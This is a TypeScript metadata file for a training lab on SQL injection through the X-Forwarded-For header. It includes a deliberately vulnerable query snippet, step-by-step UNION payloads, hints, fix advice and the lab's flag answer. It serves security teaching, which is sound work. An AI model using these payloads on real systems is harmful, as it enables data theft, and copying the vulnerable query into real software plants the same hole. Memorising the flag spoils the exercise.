// src/modules/practice-labs/sql-injection/labs/lab5/lab5.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lab5Metadata: LabMetadata = {
  slug: 'sqli-http-header',
  title: 'SQL Injection: HTTP Header Injection (X-Forwarded-For)',
  ar_title: 'حقن SQL: الحقن عبر HTTP Header',
  description:
    "TrackPro analytics logs every page visit using the visitor's IP from X-Forwarded-For — injected directly into a raw SQL query. Most scanners never check headers.",
  ar_description:
    'منصة TrackPro تسجّل كل زيارة باستخدام IP الزائر من X-Forwarded-For header — يُحقن مباشرة في raw SQL query. معظم الـ scanners لا تفحص الـ headers.',
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: [
    'SQL Injection',
    'HTTP Header Injection',
    'X-Forwarded-For',
    'UNION Attack',
    'Out-of-Band Recon',
  ],
  xpReward: 400,
  pointsReward: 200,
  duration: 45,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'Inject a UNION payload into the X-Forwarded-For header to extract a hidden admin secret from the database.',
  ar_goal:
    'احقن payload UNION في X-Forwarded-For header لاستخراج سر مخفي للمدير من قاعدة البيانات.',

  briefing: {
    en: `TrackPro is an analytics SaaS used by hundreds of websites to track visitor behavior.
Every page visit you make is logged with your IP address, action type, and timestamp.
The POST /log-visit endpoint is completely public — no auth required.
You've tested every input field. Nothing injectable. The developers did their homework... on the body.
But HTTP requests have more than just a body.
There's a header that load balancers use to pass the real client IP.
The developer called it "server-controlled". 
They were wrong.`,
    ar: `TrackPro هي خدمة تحليلات SaaS تستخدمها مئات المواقع لتتبع سلوك الزوار.
كل زيارة تقوم بها تُسجَّل بعنوان IP الخاص بك ونوع الإجراء والطابع الزمني.
نقطة POST /log-visit عامة تماماً — لا تحتاج مصادقة.
اختبرت كل حقل إدخال. لا شيء قابل للحقن. المطورون أدّوا واجبهم... في الـ body.
لكن طلبات HTTP تحتوي على أكثر من مجرد body.
هناك header تستخدمه موازنات التحميل لتمرير IP العميل الحقيقي.
المطور أسماه "خاضع لسيطرة الخادم".
كان مخطئاً.`,
  },

  stepsOverview: {
    en: [
      'Call POST /log-visit normally — understand the response structure and what gets logged',
      'Identify which HTTP header carries the IP address and confirm it is reflected in the response',
      'Test the header for injection — confirm the IP value is used in a raw SQL query',
      'Determine the column count and structure of the log query to prepare your UNION payload',
      'Inject the full UNION payload via the header to extract the hidden admin secret',
    ],
    ar: [
      'استدعِ POST /log-visit بشكل طبيعي — افهم بنية الاستجابة وما يُسجَّل',
      'حدد أي HTTP header يحمل عنوان IP وأكّد أنه ينعكس في الاستجابة',
      'اختبر الـ header للحقن — أكّد أن قيمة IP تُستخدم في raw SQL query',
      'حدد عدد الأعمدة وبنية استعلام السجل لتحضير payload الـ UNION',
      'احقن payload UNION الكامل عبر الـ header لاستخراج السر المخفي للمدير',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'TrackPro POST /log-visit reads the client IP from X-Forwarded-For header (standard in cloud environments behind load balancers) and injects it directly into a raw SQL query to fetch visit history. ' +
      "The developer trusted headers as 'server-controlled' — a critical misconception. X-Forwarded-For is freely writable by any HTTP client.",
    vulnerableCode:
      "const ip = req.headers['x-forwarded-for']; // attacker-controlled!\n" +
      'const query = `SELECT action AS ip, type, createdAt FROM "LabGenericLog"\n' +
      "  WHERE userId='...' AND labId='...' AND action = '${ip}'`;",
    exploitation:
      "Set header: X-Forwarded-For: 1.1.1.1' UNION SELECT body, title, author FROM \"LabGenericContent\" WHERE title='admin_secret'--\n" +
      "The flag appears in the 'ip' field of the returned visit log row.",
    steps: {
      en: [
        "POST /log-visit with X-Forwarded-For: 1.2.3.4 → response includes visits where ip = '1.2.3.4'. Header value is directly reflected.",
        "POST /log-visit with X-Forwarded-For: 1.2.3.4' → if visits returns [] (query broke silently), the header is injected into raw SQL confirmed.",
        'Count columns: the response returns 3 fields: ip, type, createdAt. UNION must return exactly 3 columns.',
        "Test UNION: X-Forwarded-For: 1.1.1.1' UNION SELECT 'test','col2','col3'-- → 'test' appears in ip field. Column types confirmed.",
        "Final payload: X-Forwarded-For: 1.1.1.1' UNION SELECT body, title, author FROM \"LabGenericContent\" WHERE title='admin_secret'-- → flag appears in ip field of response",
      ],
      ar: [
        "أرسل POST /log-visit مع X-Forwarded-For: 1.2.3.4 → تتضمن الاستجابة زيارات حيث ip = '1.2.3.4'. قيمة الـ header تنعكس مباشرة.",
        "أرسل POST /log-visit مع X-Forwarded-For: 1.2.3.4' → إن أرجعت الزيارات [] (الاستعلام انكسر بصمت)، الـ header مُحقَن في raw SQL مؤكَّد.",
        'احسب الأعمدة: الاستجابة تُرجع 3 حقول: ip, type, createdAt. UNION يجب أن يُرجع 3 أعمدة بالضبط.',
        "اختبر UNION: X-Forwarded-For: 1.1.1.1' UNION SELECT 'test','col2','col3'-- → تظهر 'test' في حقل ip. أنواع الأعمدة مؤكَّدة.",
        "الـ payload النهائي: X-Forwarded-For: 1.1.1.1' UNION SELECT body, title, author FROM \"LabGenericContent\" WHERE title='admin_secret'-- → يظهر العلم في حقل ip في الاستجابة",
      ],
    },
    fix: [
      'Never trust X-Forwarded-For for security-sensitive operations — it is client-controlled',
      'Use req.socket.remoteAddress for the real server-side IP when behind a trusted reverse proxy',
      'Parameterize all queries including those using header-derived values',
      'Whitelist IP address format before using in any query: validate against /^[0-9.]+$/',
    ],
  },

  postSolve: {
    explanation: {
      en: 'HTTP Header SQL Injection exploits the assumption that headers are server-controlled and therefore trusted. X-Forwarded-For is a standard header that any HTTP client can freely set to any value. When its value is concatenated directly into a SQL query, it becomes a full injection vector invisible to most body-focused security scanners and WAF rules.',
      ar: 'يستغل حقن SQL عبر HTTP Header الافتراض بأن الـ headers خاضعة لسيطرة الخادم وبالتالي موثوقة. X-Forwarded-For هو header قياسي يمكن لأي HTTP client ضبطه بحرية لأي قيمة. عندما تُدمج قيمته مباشرة في استعلام SQL، يصبح متجه حقن كامل غير مرئي لمعظم أدوات الفحص الأمني المركّزة على الـ body وقواعد WAF.',
    },
    impact: {
      en: 'Silent, hard-to-detect data exfiltration. Because the injection point is in a request header rather than a body parameter, it bypasses most input validation, logging, and WAF rules focused on request bodies. Often missed in penetration tests and bug bounty assessments.',
      ar: 'استخراج بيانات صامت يصعب اكتشافه. لأن نقطة الحقن في header الطلب بدلاً من معامل الـ body، فإنه يتجاوز معظم التحقق من المدخلات والتسجيل وقواعد WAF المركّزة على أجسام الطلبات. غالباً ما يُفوَّت في اختبارات الاختراق وتقييمات مكافآت الأخطاء.',
    },
    fix: [
      'Treat ALL request data as untrusted: body, query params, headers, cookies',
      'Use parameterized queries universally — no exceptions based on data source',
      'Extend WAF rules and security scanners to inspect header values for SQLi patterns',
      'Log and monitor unusual header values in production environments',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 10,
      content:
        "Try POST /log-visit with X-Forwarded-For: 1.2.3.4 — observe the response. The 'ip' in returned visits equals your header value exactly. The header is reflected in the query.",
    },
    {
      order: 2,
      xpCost: 20,
      content:
        "Add a single quote to the header: X-Forwarded-For: 1.2.3.4' — if visits returns empty (query broke silently), the header value is injected raw into SQL.",
    },
    {
      order: 3,
      xpCost: 40,
      content:
        "The response returns 3 columns: ip, type, createdAt. Your UNION must return 3 columns too. Target table: LabGenericContent, filter by title='admin_secret'. The flag will appear in the 'ip' field.",
    },
  ],

  flagAnswer: 'FLAG{HTTP_HEADER_SQLI_XFF}',
  initialState: {
    contents: [
      {
        title: 'page_meta',
        body: 'Homepage — /index',
        isPublic: true,
        author: 'system',
      },
      {
        title: 'page_meta',
        body: 'Dashboard — /dashboard',
        isPublic: true,
        author: 'system',
      },
      {
        title: 'admin_secret',
        body: 'FLAG{HTTP_HEADER_SQLI_XFF}',
        isPublic: false,
        author: 'admin',
      },
    ],
  },
};
